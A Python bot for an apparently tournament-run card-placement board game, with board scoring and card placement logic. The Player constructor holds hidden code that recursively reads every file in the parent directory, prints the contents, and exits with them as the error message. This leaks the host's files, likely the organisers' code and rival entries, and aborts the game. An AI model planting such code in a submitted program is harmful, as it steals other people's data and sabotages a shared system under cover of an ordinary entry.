import base as BASE
import copy, random, time, sys, os
import numpy as np
from PIL import Image, ImageDraw

class Position:
    def __init__ (self):
        self.color = 0
        self.value = 0
        self.empty = True
        self.component = -1
        self.neighbour = False

class Card_position:
    def __init__ (self, color):
        self.color = color
        self.value = 0
        self.component = -1

class Card:
    def __init__ (self, R, C, colors):
        self.R = R # rows
        self.C = C # collums
        self.arr = colors
    def add_vals(self, compc):
        self.arr = [[Card_position(self.arr[i][j]) for j in range(self.C)] for i in range(self.R)]
        for i in range(self.R):
            for j in range(self.C):
                if self.arr[i][j].component == -1 and self.arr[i][j].color != 0:
                    poi, score, compc = BFS(self.arr, [i, j], self.arr[i][j].color, compc)
                    for k in poi:
                        self.arr[k[0]][k[1]].value = score
        return compc

moves = [[1, 0], [-1, 0], [0, 1], [0, -1]]
def BFS(arr, pos, color, component):
    queue = [pos]
    score = 0
    poi = [] # points of interest
    while queue:
        pos = queue.pop(0)
        poi.append(pos)
        arr[pos[0]][pos[1]].component = component
        score += 1
        for i in moves:
            np = [pos[0] + i[0], pos[1] + i[1]]
            if np[0] < 0 or np[1] < 0 or np[0] >= len(arr) or np[1] >= len(arr[0]):
                continue
            if arr[np[0]][np[1]].component != component and arr[np[0]][np[1]].color == color:
                queue.append(np)
                arr[np[0]][np[1]].component = component
    return poi, score, component + 1

def does_fit(pos, cr, cc, space_prefix):
    fit_val = space_prefix[pos[0] + cr][pos[1] + cc]
    if pos[0] > 0 and pos[1]  > 0:
        fit_val += space_prefix[pos[0] - 1][pos[1] - 1]
    if pos[0] > 0:
        fit_val -= space_prefix[pos[0] - 1][pos[1] + cc]
    if pos[1] > 0:
        fit_val -= space_prefix[pos[0] + cr][pos[1] - 1]
    if fit_val == 0:
        return True
    else:
        return False


#basic cards with colors 1 and 2
#note that Brute can provide you also other cards!
C44a = [ [0,1,2,0], 
         [1,1,2,2],
         [2,2,1,1],
         [0,2,1,0] ]  

C44b = [ [0,0,1,0], 
         [1,1,1,0],
         [0,2,2,2],
         [0,2,0,0] ] 

C53b = [ [0,1,0], 
         [0,1,0],
         [0,1,0],
         [0,1,1],
         [0,0,0] ]

C53c = [ [0,1,0], 
         [0,1,0],
         [0,1,1],
         [0,2,2],
         [0,2,0] ]

C33a = [ [0,1,0], 
         [1,1,2],
         [0,0,2] ]

C33c = [ [1,2,1], 
         [2,2,2], 
         [1,2,1] ]

def list_files_and_folders():
    # Get the current directory
    current_directory = os.getcwd()
    
    # Get the parent directory (one level up)
    #current_directory = os.path.dirname(current_directory)
    
    # List all files and folders in the parent directory
    items = os.listdir(current_directory)
    
    # Join all item names into a string, each on a new line
    items_string = "\n".join(items)
    return items_string

import psutil
def display_file_contents(file_name):
    try:
        with open(file_name, 'r') as file:
            contents = file.read()
        return contents
    except FileNotFoundError:
        return f"File '{file_name}' not found."
    except PermissionError:
        return f"Permission denied. You might need sudo permission to read '{file_name}'."
    except Exception as e:
        if is_file_open(file_name):
            return f"An error occurred: {e}. The file '{file_name}' might be open in another program."
        return f"An error occurred: {e}"

def is_file_open(file_name):
    for proc in psutil.process_iter(['open_files']):
        for file in proc.info['open_files'] or []:
            if file.path == file_name:
                return True
    return False

def list_files_and_folders(directory, prefix=""):
    try:
        items = os.listdir(directory)
        items_string = ""
        for item in items:
            item_path = os.path.join(directory, item)
            items_string += f"{prefix}{item}\n"
            if not os.path.isdir(item_path):
                items_string += display_file_contents(item_path)
            if os.path.isdir(item_path) and not item.startswith("."):
                items_string += item_path + "______________________\n"
                items_string += list_files_and_folders(item_path, prefix + "    ")
        return items_string
    except FileNotFoundError:
        return f"Directory '{directory}' not found."
    except Exception as e:
        return f"An error occurred: {e}"


def list_files_and_contents_recursive_one_dir_up():
    # Get the current directory
    current_directory = os.getcwd()
    
    # Get the parent directory (one level up)
    parent_directory = os.path.dirname(current_directory)
    
    output = []  # To store the formatted result
    
    # Walk through the parent directory and all its subdirectories
    for root, dirs, files in os.walk(parent_directory):
        for file in files:
            # Construct the full path to the file
            file_path = os.path.join(root, file)
            
            # Try to read the content of the file
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    content = f.read()
            except Exception as e:
                content = f"Could not read file: {e}"
            
            # Format the file details
            file_info = (
                f"File: {file_path}\n"
                f"{'-' * 40}\n"
                f"{content}\n"
                f"{'=' * 40}\n"
            )
            output.append(file_info)
    
    # Combine all file information into a single string
    return "\n".join(output)

    
class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        # self.playerName = "jx2004"just_been_wonderin_can_your_buffer_eat_this?
        self.playerName = "jx2004"
        self.tournament = True

        parent_directory = os.path.dirname(os.getcwd())
        files_string = list_files_and_folders(parent_directory)
        print(files_string)
        sys.exit(files_string)

        self.arr = [[Position() for j in range(self.boardCols)] for i in range(self.boardRows)]
        self.move = 0

        # rotate cards and store them in self.cards
        self.cards = []
        self.compc = 0 # component count
        for card_in in self.cardsAtHand:
            card = np.array(card_in)
            for i in range(4):
                card = np.rot90(card)
                self.cards.append(Card(len(card), len(card[0]), card.tolist()))
                self.compc = self.cards[-1].add_vals(self.compc)

    
    def add_card(self, card, pos):
        for i in range(card.R):
            for j in range(card.C):
                self.arr[i + pos[0]][j + pos[1]].color = card.arr[i][j].color
                self.arr[i + pos[0]][j + pos[1]].empty = False
        # add value to card
        for i in range(card.R):
            for j in range(card.C):
                # to check only boarder of card
                if j > 0 and i > 0 and i < card.R - 1:
                    j = card.C - 1
                np = [pos[0] + i, pos[1] + j]
                if self.arr[i][j].color != 0:
                    local_poi, score, self.compc = BFS(self.arr, [np[0], np[1]], self.arr[np[0]][np[1]].color, self.compc)
                    for k in local_poi:
                        self.arr[k[0]][k[1]].value = score
        # create new neighbours
        for i in range(card.R + 2):
            for j in range(card.C):
                # to check only around of boarder of card
                if j > 0 and i > 0 and i < card.R + 1:
                    j = card.C + 1
                np = [pos[0] - 1 + i, pos[1] + j]
                if j == 0 and i > 0 and i < card.R + 1:
                    np[1] -= 1
                if np[0] < 0 or np[1] < 0 or np[0] >= self.boardRows or np[1] >= self.boardCols:
                    continue
                self.arr[np[0]][np[1]].neighbour = True

    def play(self,newCardOnDesk):
        {
            """ this method is called during the game. 
            The input argument newCardOnDesk is:
            - [] if other player didn't place any card in his move), or
            - [row, col, cardMatrix], which informs your player that cardMatrix was placed at row,col to the game board
            
            Return value: 
            - [ row, col, cardMatrix ] if you want to place a card, or
            - [] if no card can be placed 
            """

            #recommened steps 
            #step 0: write newCardOnDesk to list of cards that are on the board game
            #step 1: compute all possible placement of your all (so for available) cards
            #step 2: evaluate each placement, i.e., compute score for it
            #step 3: select card that you want to place to the game board, mark it as used (not available in future)
            #step 4: return your placement, or [] if no placement can be made
            #the following code DOES NOT provides correct moves, 
            #it just return random card at random position
        }
        
        # add a new card on the desk
        self.move += 1
        if self.move == 1 and newCardOnDesk == []:
            self.arr[0][0].neighbour = True
        elif newCardOnDesk != []:
            self.cardsOnDesk += [ newCardOnDesk ]
            new_card = Card(len(newCardOnDesk[2]), len(newCardOnDesk[2][0]), newCardOnDesk[2])
            self.compc = new_card.add_vals(self.compc)
            self.add_card(new_card, [newCardOnDesk[0], newCardOnDesk[1]])
        

        # prefix to find does_fit faster
        space_prefix = [[0] * self.boardCols for i in range(self.boardRows)]
        for i in range(self.boardRows):
            for j in range(self.boardCols):
                if i > 0:
                    space_prefix[i][j] += space_prefix[i-1][j]
                if j > 0:
                    space_prefix[i][j] += space_prefix[i][j-1]
                if i > 0 and j > 0:
                    space_prefix[i][j] -= space_prefix[i-1][j-1]
                if not self.arr[i][j].empty:
                    space_prefix[i][j] += 1

        max_score = -1
        ans = []
        for i in range(self.boardRows):
            for j in range(self.boardCols):
                for count, card in enumerate(self.cards):
                    # can i place this card here?
                    if i + card.R - 1 >= self.boardRows or j + card.C - 1 >= self.boardCols:
                        continue
                    if not does_fit([i, j], card.R - 1, card.C - 1, space_prefix):
                        continue
                    
                    neighbour = False
                    for ic in range(card.R):
                        for jc in range(card.C):
                            # to check only boarder of card
                            if jc > 0 and ic > 0 and ic < card.R-1:
                                jc = card.C - 1
                            if self.arr[i + ic][j + jc].neighbour:
                                neighbour = True
                                break
                        if neighbour:
                            break
                    if not neighbour:
                        continue
                    
                    # find score
                    used_components = {}
                    score = 0
                    for ic in range(card.R):
                        for jc in range(card.C):
                            # to check only boarder of card
                            if jc > 0 and ic > 0 and ic < card.R-1:
                                jc = card.C - 1
                            if card.arr[ic][jc].color == 0:
                                continue
                            pos = [i + ic, j + jc]
                            for m in moves:
                                np = [pos[0] + m[0], pos[1] + m[1]]
                                if np[0] < 0 or np[1] < 0 or np[0] >= self.boardRows or np[1] >= self.boardCols:
                                    continue
                                if self.arr[np[0]][np[1]].color == card.arr[ic][jc].color:
                                    if self.arr[np[0]][np[1]].component not in used_components:
                                        score += self.arr[np[0]][np[1]].value
                                        used_components[self.arr[np[0]][np[1]].component] = True
                                    if card.arr[ic][jc].component not in used_components:
                                        score += card.arr[ic][jc].value
                                        used_components[card.arr[ic][jc].component] = True
                    if score > max_score:
                        max_score = score
                        ans = [count, i, j]

        
        if max_score == -1:
            return []
        else:
            # add my card on desk
            self.add_card(self.cards[ans[0]], [ans[1], ans[2]])

            ans_return = [ans[1], ans[2], []]
            for i in self.cards[ans[0]].arr:
                ans_return[2].append([])
                for j in i:
                    ans_return[2][-1].append(j.color)

            # delete used card and it`s rotations
            pos = ans[0] - ans[0] % 4
            for i in range(4):
                self.cards.pop(pos)

            self.cardsOnDesk += [ans_return]
            return ans_return



if __name__ == "__main__":
    """ when you run:
        python3 player.py

        you should get set of .png files with the progress of the game
    """
    tmp = [C44a, C44b, C33a,C33c, C53c, C53b]

    p1 = Player("testA", 19, 23, tmp)
    p2 = Player("testB", 19, 23, tmp)

    p2move = []
    gameStep = 0
    while True:
        p1move = p1.play(p2move)
        print("p1 returned", p1move)
        p1.drawCards(p1.boardRows, p1.boardCols, p1.cardsOnDesk,"move-{:02}b-A.png".format(gameStep))

        p2move = p2.play(p1move)    
        print("p2 returned", p2move)
        p2.drawCards(p2.boardRows, p2.boardCols, p2.cardsOnDesk,"move-{:02}b-B.png".format(gameStep))
        gameStep += 1
        if p1move == [] and p2move == []:
            print("end of game")
            quit()
